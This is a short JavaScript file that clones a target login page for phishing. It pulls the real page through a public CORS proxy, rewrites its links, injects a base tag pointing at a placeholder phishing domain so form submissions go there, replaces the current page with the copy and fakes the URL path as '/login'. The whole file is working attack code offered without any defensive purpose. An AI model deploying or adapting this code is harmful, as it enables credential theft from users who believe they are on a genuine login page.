page_src = "https://login.vulnwebsite.com/";
phishing_url="http://yourphishingdomain.com/";

function doHTMLMagic(pageSource, baseURL, phishDomain) {
	replaceSrc = pageSource.replace('href="/', "href=\"" + baseURL+ '/');
	replaceSrc = replaceSrc.replace('src="/', "src=\"" + baseURL+ '/');
	replaceSrc = replaceSrc.replace('<head>', '<head><base href="' + phishDomain + '">');
	return replaceSrc;
}

function createCORSRequest(method, url) {
  var xhr = new XMLHttpRequest();
  if ("withCredentials" in xhr) {
    xhr.open(method, url, true);
  } else if (typeof XDomainRequest != "undefined") {
    xhr = new XDomainRequest();
    xhr.open(method, url);
  } else {
    xhr = null;
  }
  return xhr;
}

function makeCorsRequest(baseURL, phishDomain) {
  var url = 'https://cors-anywhere.herokuapp.com/' + baseURL;

  var xhr = createCORSRequest('GET', url);
  if (!xhr) {
    return;
  }

  xhr.onload = function() {
    var pageSourceStr = doHTMLMagic(xhr.responseText, baseURL, phishDomain)
  	document.open();
    document.write(pageSourceStr);
    document.close();
  };

  xhr.send();
}

makeCorsRequest(page_src, phishing_url);
window.history.pushState("", "Login", "/login");